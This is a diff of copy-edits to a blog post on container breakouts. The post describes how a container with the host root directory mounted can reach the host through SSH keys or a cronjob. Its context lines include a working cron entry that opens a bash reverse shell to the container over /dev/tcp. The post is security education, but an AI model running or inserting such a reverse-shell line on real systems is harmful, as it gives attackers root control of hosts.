@@ -27,17 +27,17 @@ The following posts are part of the series:
 
 ## Intro
 
-The **motivation** of this post is to **collect container breakouts**. I was considering writing a huge post about all the stuff you must know to break out of container. But, if I would do so, it will take ages to write, es well to read and at the end you would just scroll direct to the PoC code snippets. So I dropped that idea and will just link to additional readings.
+The **motivation** of this post is to **collect container breakouts**. I was considering writing a huge post about all the stuff you must know to break out of the container. But, if I would do so, it will take ages to write, es well to read and at the end, you would just scroll directly to the PoC code snippets. So I dropped that idea and will just link to additional readings.
 
 I also realized during writing that the post must be sliced into more digestible pieces. 
 
-The **first post** is **about** what could probably go wrong if the **host root directory** is **accessible** from the container. Due to the fact that we have only access to the disc, this approach is absolutely not an OpSec-safe approach to escalate your privileges. 
+The **first post** is **about** what could probably go wrong if the **host root directory** is **accessible** from the container. Since we have only access to the disc, this approach is 	not an OpSec-safe approach to escalate your privileges. 
 
-The proposed techniques use Unix operating system features that are more system security related, then container security related. But, as part of a comprehensive series it has to take place to show the importance.
+The proposed techniques use Unix operating system features that are more system security related, then container security-related. But, as part of a comprehensive series, it has to take place to show the importance.
 
 ## Shared Host root directory
 
-Access to a container that shares directories with the host is **not** an **immediate problem**. **But** if the container has **access to** the **host root directory** as user `root` (pre-assumed that there is no [AppArmor](https://man.cx/apparmor(7)) or [SELinux](https://man7.org/linux/man-pages/man8/selinux.8.html) in place) you hit the jack pot! We have multiple ways to approach the underlying host.
+Access to a container that shares directories with the host is **not** an **immediate problem**. **But** if the container has **access to** the **host root directory** as user `root` (pre-assumed that there is no [AppArmor](https://man.cx/apparmor(7)) or [SELinux](https://man7.org/linux/man-pages/man8/selinux.8.html) in place) you hit the jackpot! We have multiple ways to approach the underlying host.
 
 Let’s assume that the host root directory is accessible at `/hostfs`
 
@@ -82,7 +82,7 @@ For this scenario, the SSH daemon is running on the host, the configuration is n
 
 ### Cronjob
 
-Due to the fact that in a default setup the container is **direct connected to the host**, we can initiate not only connections from the container to the host, also vice-versa. To do so, we need the IP address from the container. Depending on the binaries that are available on the host, we initiate a **reverse shell by** a **cronjob** that connects to an exposed port on the container. In this showcase, we use `bash` for the reverse connection and `netcat` to handle the connection in the container. The following line is all we need:
+Because in a default setup the container is **direct connected to the host**, we can initiate not only connections from the container to the host, also vice-versa. To do so, we need the IP address from the container. Depending on the binaries that are available on the host, we initiate a **reverse shell by** a **cronjob** that connects to an exposed port on the container. In this showcase, we use `bash` for the reverse connection and `netcat` to handle the connection in the container. The following line is all we need:
 
 ```
 * * * * * root bash -i >& /dev/tcp/$CONTAINER_IP/$CONTAINER_PORT 0>&1
@@ -116,7 +116,7 @@ In this second showcase, we assumed that a cron service was running on the host.
 
 ## Conclusion
 
-Both examples are approaches to get direct access to host system. They are modifying the host and **absolutely not minimal-inversive or OpSec-safe**. If you **make mistakes**, you may mix up the configuration of the **host system** and **crash** it. **Be careful !!**
+Both examples are approaches to get direct access to the host system. They are modifying the host and **not minimal-inversive or OpSec-safe**. If you **make mistakes**, you may mix up the configuration of the **host system** and **crash** it. **Be careful !!**
 
 Furthermore, the proposed techniques are possible approaches to escape out of a container if one has access to the host root directory. By the nature of this attack vector, it is more a general Unix privileges escalation technique, then a dedicated container breakout.
 
